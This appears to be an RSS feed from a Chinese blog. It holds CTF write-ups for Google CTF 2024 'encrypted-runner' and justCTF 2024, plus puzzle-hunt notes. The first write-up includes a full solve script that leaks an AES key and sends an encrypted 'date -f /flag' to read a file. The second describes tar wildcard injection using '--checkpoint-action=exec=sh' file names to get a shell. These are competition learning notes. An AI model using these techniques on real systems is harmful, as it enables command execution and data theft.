      <description>简介 简单题题目都能看懂，就是都没做出来，最后还是队友做出来一道&#xA;pwn-encrypted-runner 题目下载：https://storage.googleapis.com/2024-attachments/b557dbb14eb7e9324cf9b76e1d4f8ecbdad9d1e56e0c1dc525a98f6e365e83b418f969421d7fd82bc71788bf41ea02e8cabe62f6820720b0edd9a4de3e49bf74.zip&#xA;Welcome to encrypted command runner. What do you want to do? - encrypt command (e.g. &amp;#39;encrypt echo test&amp;#39;) - run command (e.g. &amp;#39;run fefed6ce5359d0e886090575b2f1e0c7&amp;#39;) - exit 运行后提供了两个选项，加密命令和运行命令。加密命令会将后面的命令转化为16个字节，长度不够则用0补齐，传给自己写的一个aes程序做加密。运行命令则是接收一串十六进制字符，长度也是最多16个byte，用aes解密后得到真实命令再运行。本地运行aes时需要创建一个长度16字节的key文件，但因为拿不到服务器的key文件，所以加密后的数据也不同&#xA;从python代码里可以得知，允许的命令只有三个， date echo ls 。 date 不允许后面有参数， echo 后面可以跟 [\w. ]+ ， ls 后面可以跟 [/\w]+ 在加密命令的时候，会检查命令和参数是否合规，但在运行命令的时候，只会检查命令而不检查参数。因此想到如果可以让它运行 date -f /flag ，就可以拿到flag了。但现在的问题就是无法得知服务器端aes加密用的key是什么，无法构建出来加密后的命令&#xA;看了解答后，知道漏洞出在什么地方了，aes是用c写的程序，理论上传入aes的是16个byte，输出也是16个byte，但这里的aes实现，输入的是16个uint32，就是可以传入大于0xff的数，然后通过解密得到的数值与&amp;#39;R&amp;#39;异或就能泄露出key的值，这是什么原理就不知道了！写了个程序测试一下&#xA;from pwn import * from random import randbytes, randint key = randbytes(16) print(&amp;#39;key: &amp;#39;, end=&amp;#39;&amp;#39;) for i in key: print(hex(i), end=&amp;#39; &amp;#39;) print() with open(&amp;#39;key&amp;#39;, &amp;#39;wb&amp;#39;) as f: f.</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
简介
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<p>简单题题目都能看懂，就是都没做出来，最后还是队友做出来一道</p>
</div>
</div>
<div id="outline-container-headline-2" class="outline-2">
<h2 id="headline-2">
pwn-encrypted-runner
</h2>
<div id="outline-text-headline-2" class="outline-text-2">
<p>题目下载：<a href="https://storage.googleapis.com/2024-attachments/b557dbb14eb7e9324cf9b76e1d4f8ecbdad9d1e56e0c1dc525a98f6e365e83b418f969421d7fd82bc71788bf41ea02e8cabe62f6820720b0edd9a4de3e49bf74.zip">https://storage.googleapis.com/2024-attachments/b557dbb14eb7e9324cf9b76e1d4f8ecbdad9d1e56e0c1dc525a98f6e365e83b418f969421d7fd82bc71788bf41ea02e8cabe62f6820720b0edd9a4de3e49bf74.zip</a></p>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Welcome to encrypted command runner.
</span></span><span style="display:flex;"><span>What do you want to do?
</span></span><span style="display:flex;"><span>- encrypt command (e.g. &#39;encrypt echo test&#39;)
</span></span><span style="display:flex;"><span>- run command (e.g. &#39;run fefed6ce5359d0e886090575b2f1e0c7&#39;)
</span></span><span style="display:flex;"><span>- exit</span></span></code></pre></div>
</div>
<p>运行后提供了两个选项，加密命令和运行命令。加密命令会将后面的命令转化为16个字节，长度不够则用0补齐，传给自己写的一个aes程序做加密。运行命令则是接收一串十六进制字符，长度也是最多16个byte，用aes解密后得到真实命令再运行。本地运行aes时需要创建一个长度16字节的key文件，但因为拿不到服务器的key文件，所以加密后的数据也不同<br>
从python代码里可以得知，允许的命令只有三个， <code>date</code> <code>echo</code> <code>ls</code> 。 <code>date</code> 不允许后面有参数， <code>echo</code> 后面可以跟 <code>[\w. ]+</code> ， <code>ls</code> 后面可以跟 <code>[/\w]+</code> <br>
在加密命令的时候，会检查命令和参数是否合规，但在运行命令的时候，只会检查命令而不检查参数。因此想到如果可以让它运行 <code>date -f /flag</code> ，就可以拿到flag了。但现在的问题就是无法得知服务器端aes加密用的key是什么，无法构建出来加密后的命令<br>
看了解答后，知道漏洞出在什么地方了，aes是用c写的程序，理论上传入aes的是16个byte，输出也是16个byte，但这里的aes实现，输入的是16个uint32，就是可以传入大于0xff的数，然后通过解密得到的数值与&#39;R&#39;异或就能泄露出key的值，这是什么原理就不知道了！写了个程序测试一下</p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">from</span> random <span style="color:#f92672">import</span> randbytes, randint
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  key <span style="color:#f92672">=</span> randbytes(<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#39;key: &#39;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> key:
</span></span><span style="display:flex;"><span>      print(hex(i), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39; &#39;</span>)
</span></span><span style="display:flex;"><span>  print()
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;key&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">.</span>write(key)
</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;aes&#34;</span>, level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;error&#39;</span>)
</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">=</span> [randint(<span style="color:#ae81ff">0x100</span>, <span style="color:#ae81ff">0x1000</span>) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>)]
</span></span><span style="display:flex;"><span>  i <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;encrypt &#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>join(hex(i)[<span style="color:#ae81ff">2</span>:] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> payload)
</span></span><span style="display:flex;"><span>  print(i)
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(i<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>  o <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>  print(o<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;aes&#34;</span>, level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;error&#39;</span>)
</span></span><span style="display:flex;"><span>  i <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;decrypt &#39;</span> <span style="color:#f92672">+</span> o
</span></span><span style="display:flex;"><span>  print(i<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(i)
</span></span><span style="display:flex;"><span>  o <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>  print(o<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>  s <span style="color:#f92672">=</span> o<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#39;the xor value of key and each decrypt value:&#39;</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
</span></span><span style="display:flex;"><span>      h <span style="color:#f92672">=</span> int(s[i], <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>      print(hex(h <span style="color:#f92672">^</span> key[i]), chr(h <span style="color:#f92672">^</span> key[i]), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;, &#39;</span>)
</span></span><span style="display:flex;"><span>      print()</span></span></code></pre></div>
</div>
<p>输出如下</p>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>key: 0xf6 0x7b 0x4b 0xfc 0x27 0x22 0x31 0xc5 0x6b 0x17 0x62 0x80 0xb 0xcc 0xb2 0xe9
</span></span><span style="display:flex;"><span>encrypt f8f 2fa 399 6aa 67d 33e 87c 919 fcf a82 b39 809 45c cb6 f24 183
</span></span><span style="display:flex;"><span>30 af b8 33 3f 1b ac 61 58 70 8d f4 e7 7a 89 b7
</span></span><span style="display:flex;"><span>decrypt 30 af b8 33 3f 1b ac 61 58 70 8d f4 e7 7a 89 b7
</span></span><span style="display:flex;"><span>a4 29 19 ae 75 70 63 97 39 45 30 d2 59 9e e0 bb
</span></span><span style="display:flex;"><span>the xor value of key and each decrypt value:
</span></span><span style="display:flex;"><span>0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R, 0x52 R,</span></span></code></pre></div>
</div>
<p>可以看出对于随机的key和随机超过0xff的输入，解密后的数值与对应key的数值异或结果都是R，那么反过来也可以得到key的数值。对于本题来说，可以用ls命令跟着13个大于0xff的字符，经过加密解密后，与R异或后得到key，那么只有key前三位的值是不确定的，可以遍历搜索并用题中给出的echo test的例子进行验证<br>
另外一个不理解的地方，在运行命令后得到，应该如何解码成需要的13个字节，看了解答需要 <code>bash -c &#34;echo -n &#39;&#39;$&#39;\017&#39;&#39;[&#39;$&#39;\034\203&#39;&#39;:Q&#39;$&#39;\031&#39;&#39;z&#39;$&#39;\a\035\252\370\373&#39;&#34;</code> 这样才行，直接 <code>echo -n</code> 不知道为什么得到的就不对，不知道为什么<br>
解答如下，参考<a href="https://github.com/google/google-ctf/blob/main/2024/quals/pwn-encrypted-runner/challenge/solve.py">https://github.com/google/google-ctf/blob/main/2024/quals/pwn-encrypted-runner/challenge/solve.py</a></p>
<div class="src src-python">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;encrypted-runner.2024.ctfcompetition.com&#39;</span>, <span style="color:#e6db74">&#39;1337&#39;</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#echo_test = &#39;fefed6ce5359d0e886090575b2f1e0c7&#39;</span>
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;- run command (e.g. &#39;run &#34;</span>)
</span></span><span style="display:flex;"><span>  echo_test <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#39;&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>  print(echo_test)
</span></span><span style="display:flex;"><span>  c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x106</span>
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;encrypt ls &#39;</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">13</span> <span style="color:#f92672">*</span> chr(c)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Encrypted command: &#39;</span>)
</span></span><span style="display:flex;"><span>  encrypt_command <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;run &#39;</span> <span style="color:#f92672">+</span> encrypt_command)
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cannot access &#39;</span>)
</span></span><span style="display:flex;"><span>  decrypt_value <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: No such file or directory&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">27</span>]
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;exit&#39;</span>)
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;bash&#39;</span>, <span style="color:#e6db74">&#39;-c&#39;</span>, <span style="color:#e6db74">&#39;echo -n &#39;</span> <span style="color:#f92672">+</span> decrypt_value<span style="color:#f92672">.</span>decode()])
</span></span><span style="display:flex;"><span>  decrypt_value <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvall()
</span></span><span style="display:flex;"><span>  print(decrypt_value)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> [ord(<span style="color:#e6db74">&#39;R&#39;</span>) <span style="color:#f92672">^</span> i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> decrypt_value]
</span></span><span style="display:flex;"><span>  text <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;echo test&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>  find <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> find:
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>      key[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> a
</span></span><span style="display:flex;"><span>      print(a)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0xa3</span>, <span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> find:
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>          key[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> b
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> find:
</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>              key[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> c
</span></span><span style="display:flex;"><span>              cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key<span style="color:#f92672">=</span>bytes(key), mode<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>MODE_ECB)
</span></span><span style="display:flex;"><span>              ciphertext <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>encrypt(text)
</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> ciphertext <span style="color:#f92672">==</span> echo_test:
</span></span><span style="display:flex;"><span>                  find <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(bytes(key))
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;key&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">.</span>write(bytes(key))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;date -f /flag</span><span style="color:#ae81ff">\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>  cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key<span style="color:#f92672">=</span>bytes(key), mode<span style="color:#f92672">=</span>AES<span style="color:#f92672">.</span>MODE_ECB)
</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;run &#39;</span> <span style="color:#f92672">+</span> cipher<span style="color:#f92672">.</span>encrypt(cmd)<span style="color:#f92672">.</span>hex()<span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;encrypted-runner.2024.ctfcompetition.com&#39;</span>, <span style="color:#e6db74">&#39;1337&#39;</span>)
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;exit&#39;</span>)
</span></span><span style="display:flex;"><span>  o <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvall()
</span></span><span style="display:flex;"><span>  print(o<span style="color:#f92672">.</span>decode())</span></span></code></pre></div>
</div>
</div>
</div>
<div id="outline-container-headline-3" class="outline-2">
<h2 id="headline-3">
pwn-knife
</h2>
<div id="outline-text-headline-3" class="outline-text-2">
<p>TODO</p>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>第一次CTF比赛</title>
      <link>https://wind1900.github.io/ctf/%E7%AC%AC%E4%B8%80%E6%AC%A1ctf%E6%AF%94%E8%B5%9B/</link>
      <pubDate>Sun, 16 Jun 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/ctf/%E7%AC%AC%E4%B8%80%E6%AC%A1ctf%E6%AF%94%E8%B5%9B/</guid>
      <description>前言 算是第一次参加CTF比赛吧：https://2024.justctf.team/ 。找了一个队伍一起做，结果还不错，最终做出来一道简单的逆向题&#xA;分析 运行程序后会得到&#xA;JCTF COMMANDER v0.1 1. create file 2. rename file 3. print file 4. delete file 5. edit file 0. exit 虚拟了一个文件系统，根据选项可以创建，修改，打印，删除文件等。再把程序放进IDA中看一下 函数有很多，而且每个函数里嵌套层数也特别多，很多都是没用的函数。由于我不知道IDA中如何清理这些没用的函数，只好用gdb从头跑一遍看看都是干啥的，gdb里也没符号信息，不好下断点&#xA;第一个 sub_5840() 的作用是创建文件夹“fs”当作虚拟文件系统，后面的一系列方法是将不同选项对应的函数地址赋值到栈上的变量，格式很类似，从v5到v13。但是注意到程序只给了六个选项，而这里分配了9个，那么多出来的三个是什么呢？试验得知6和8都会报参数错误，7是一个archive选项，9或其它数字会导致段错误。再进一步观察选项7，它会调用 system(&amp;#34;tar cf &amp;#34;archive_name&amp;#34; *&amp;#34;) ！解题入口应该就在这里了&#xA;从网上搜索得知，如果可以创建文件 --checkpoint=1 和 --checkpoint-action=exec=sh ，那么tar命令里的*就会展开成那两个特殊的文件名并当作tar的参数解析，作用就是可以执行shell。但是创建文件时发现它有一个文件名检查，只能包含字母数字或者 - . ，不能存在 = 或者 \ ，然后卡在这里快一天&#xA;后来尝试了创建链接，其它各种参数，不带 = 的写法，都没成功。就在比赛快结束的时候，我突然想到要不试试第2个重命名选项吧，结果重命名里没有检查文件名！接下来就简单了，新建文件，重命名文件，最后选择隐藏选项7，拿到shell。看来任一个函数都要仔细检查不能跳过&#xA;结论 再接再厉</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
前言
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<p>算是第一次参加CTF比赛吧：<a href="https://2024.justctf.team/">https://2024.justctf.team/</a> 。找了一个队伍一起做，结果还不错，最终做出来一道简单的<a href="https://s3.cdn.justctf.team/b59b4ed9-aa22-4622-aca6-294db30962b9/star.tar.gz">逆向题</a></p>
</div>
</div>
<div id="outline-container-headline-2" class="outline-2">
<h2 id="headline-2">
分析
</h2>
<div id="outline-text-headline-2" class="outline-text-2">
<p>运行程序后会得到</p>
<div class="src src-text">
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>JCTF COMMANDER v0.1
</span></span><span style="display:flex;"><span>1. create file
</span></span><span style="display:flex;"><span>2. rename file
</span></span><span style="display:flex;"><span>3. print file
</span></span><span style="display:flex;"><span>4. delete file
</span></span><span style="display:flex;"><span>5. edit file
</span></span><span style="display:flex;"><span>0. exit</span></span></code></pre></div>
</div>
<p>虚拟了一个文件系统，根据选项可以创建，修改，打印，删除文件等。再把程序放进IDA中看一下
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.8hgc1biui3.webp"/>
</figure>

函数有很多，而且每个函数里嵌套层数也特别多，很多都是没用的函数。由于我不知道IDA中如何清理这些没用的函数，只好用gdb从头跑一遍看看都是干啥的，gdb里也没符号信息，不好下断点<br>
第一个 <code>sub_5840()</code> 的作用是创建文件夹“fs”当作虚拟文件系统，后面的一系列方法是将不同选项对应的函数地址赋值到栈上的变量，格式很类似，从v5到v13。但是注意到程序只给了六个选项，而这里分配了9个，那么多出来的三个是什么呢？试验得知6和8都会报参数错误，7是一个archive选项，9或其它数字会导致段错误。再进一步观察选项7，它会调用 <code>system(&#34;tar cf &#34;archive_name&#34; *&#34;)</code> ！解题入口应该就在这里了<br>
从网上搜索得知，如果可以创建文件 <code>--checkpoint=1</code> 和 <code>--checkpoint-action=exec=sh</code> ，那么tar命令里的*就会展开成那两个特殊的文件名并当作tar的参数解析，作用就是可以执行shell。但是创建文件时发现它有一个文件名检查，只能包含字母数字或者 <code>- .</code> ，不能存在 <code>=</code> 或者 <code>\</code> ，然后卡在这里快一天<br>
后来尝试了创建链接，其它各种参数，不带 <code>=</code> 的写法，都没成功。就在比赛快结束的时候，我突然想到要不试试第2个重命名选项吧，结果重命名里没有检查文件名！接下来就简单了，新建文件，重命名文件，最后选择隐藏选项7，拿到shell。看来任一个函数都要仔细检查不能跳过</p>
</div>
</div>
<div id="outline-container-headline-3" class="outline-2">
<h2 id="headline-3">
结论
</h2>
<div id="outline-text-headline-3" class="outline-text-2">
<p>再接再厉</p>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>FISHunt总结二</title>
      <link>https://wind1900.github.io/puzzlehunt/fishunt%E6%80%BB%E7%BB%93%E4%BA%8C/</link>
      <pubDate>Sun, 19 May 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/fishunt%E6%80%BB%E7%BB%93%E4%BA%8C/</guid>
      <description>第六题 与波洛克共进一餐 很久没更新，因为还是想抓紧拿到蓝带。 这道题其实不难，但是你需要了解和艺术馆有关的新闻：近期一些环保主义者将各种食物泼到名画上，找到对应的画作即可提取出答案。&#xA;Meta 元境 这道题虽然第一步解出来了大部分字母，但是当时没拼出来完整的句子，于是根据提示里得到的信息直接从第二步开始做了。&#xA;此时从标题元境得知这是个展览，需要找到参加展览的不同国家的地图去匹配，但要注意这里要找的并不是世界地图！我就卡在了这里，实际要找的是展览区域的地图，然后将匹配的国家的展览主题找出来，提取就行了。&#xA;最后一步需要用到十个小题标题上的画了，它们都和这个主题展之前某一届的主题海报非常类似。最后再根据FISHUNT的主题海报（正好有十条波浪），按照年份从新到老将这些主题的名字排列，用海报中的鱼做对角线提取，得到最终结果，完赛！</description>
      <content:encoded><![CDATA[
<div id="outline-container-headline-1" class="outline-2">
<h2 id="headline-1">
第六题 与波洛克共进一餐
</h2>
<div id="outline-text-headline-1" class="outline-text-2">
<p>很久没更新，因为还是想抓紧拿到蓝带。
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.2doiupk0p6.webp"/>
</figure>

这道题其实不难，但是你需要了解和艺术馆有关的新闻：近期一些环保主义者将各种食物泼到名画上，找到对应的画作即可提取出答案。</p>
</div>
</div>
<div id="outline-container-headline-2" class="outline-2">
<h2 id="headline-2">
Meta 元境
</h2>
<div id="outline-text-headline-2" class="outline-text-2">
<p>这道题虽然第一步解出来了大部分字母，但是当时没拼出来完整的句子，于是根据提示里得到的信息直接从第二步开始做了。<br>
此时从标题元境得知这是个展览，需要找到参加展览的不同国家的地图去匹配，但要注意这里要找的并不是世界地图！我就卡在了这里，实际要找的是展览区域的地图，然后将匹配的国家的展览主题找出来，提取就行了。<br>
<figure><img src="https://wind1900.github.io/picx-images-hosting/image.9nzm5taww8.webp"/>
</figure>

最后一步需要用到十个小题标题上的画了，它们都和这个主题展之前某一届的主题海报非常类似。最后再根据FISHUNT的主题海报（正好有十条波浪），按照年份从新到老将这些主题的名字排列，用海报中的鱼做对角线提取，得到最终结果，完赛！</p>
</div>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>FISHunt总结一</title>
      <link>https://wind1900.github.io/puzzlehunt/fishunt%E6%80%BB%E7%BB%93%E4%B8%80/</link>
      <pubDate>Mon, 01 Apr 2024 00:00:00 +0000</pubDate>
      <guid>https://wind1900.github.io/puzzlehunt/fishunt%E6%80%BB%E7%BB%93%E4%B8%80/</guid>
      <description>简介 这是一个小型的解谜活动，题目出在微信公众号上，比赛时间是3月29日晚8点到3月31日晚8点。一共也就两天时间，不过这次我们成功完赛了，在比赛结束前的80分钟。 这次的题目主题很明确，都和美术艺术有关，而且难度适中，没有讨厌的谐音梗网络梗，每道题基本上都需要两步以上才能得到最终答案。通过这次活动欣赏到了许多著名艺术作品。&#xA;第一题 细密画 这幅细密画颇有异域风情，画家细细描绘每一个场景。传说只有正确地连接局部，才能揭开画作的真正面貌…… 都是一些字谜&#xA;第一排 虚线内的格子应填入相同的形状，只是角度不同，易得“浮”字 倜傥和隽永部分合在一起，为“雕”字 单人旁和象组合成“像”字 口里有个冬，为“图”字 下面的横杠为减的意思，六七指的是笔画的第六七画，减去后得到“纹” 一个有两个读音的多音字，为“乐” 成语是双管齐下，为“管” 墨汁减去土，剩下为“黑” 第二排 金木水火土少了“木” 一个反的片，片加反为“版” 蓝色的线开始没想到什么意思，后来想到了是镜面，镜像补全后为“画” 成语是两肋插刀，为“插” 把数字和图画都转换成汉字，十十亻七为“花”字 这个是最后一个想到的，一开始以为是这个字是什么目，其实就是目眩来表示眼睛发花，图中少的部分拼到一起为“弦” 多音字，为“和” 箭头右边繁体字比简体字多出来的部分，找到这个字为“声”，繁体字是聲 第三排 箭头右边为运算符号相似的汉字，减号即为“一”字 镜像补全后为“宣” 就是个“纸”字，图片没其它意思。。 黄色方框和下面的方框有双箭头连结，下面弓箭加豆为短，短相反为长，弓加长为“张” 搜索易得“恭” 琴瑟，取“琴”字 土字去掉第三画，为“十” 左边的字都能与右边字组成ABAC形式的词，第三个是可歌可泣，问号是“歌” 第四排 阔别，图中少了舌和刂，组成“刮” 这个图解释了遇到减数字应该怎么做，刃去掉第三画为“刀” 四排二列是刀，上面加上前为“剪” 车口耳组成“辑” 迅速的交集，即相同的部分为辶，铭和奖相同的部分为夕，四排七列倒过来为罒，组成“逻” 镜像补全后为“曲” 目和眼意思相同，问号为“目” 肥皂剧是电视剧，问号为“剧” 第五排 二排一列为木，四排七列为目，组成“相” 蓝分成上中下三部分，取中间的部分下面加上见，为“览” 伞去掉三四五画为“个” 西二小，组成“票” 扌石组成“拓” 十十豆又组成“鼓” 学去掉一三画为“字” 这个一开始我以为右下角是一寸照片，后来猜想到一横还是减号，是冠减去寸，和耳丶组成“院” 第六排 二十为廿，两个倒过来组成“册” 易得“博” 这里说明了双箭头代表反义，黄色区域里是相同的部分为八，父和公的反义都为母 甲倒过来，加上耳为“邮” 山东简称鲁，去掉日为“鱼” 星空又名星月夜，月加空为“腔” 五个口，注意连结部分，组成“唱” 反战，图中少了又戈，组成“戏” 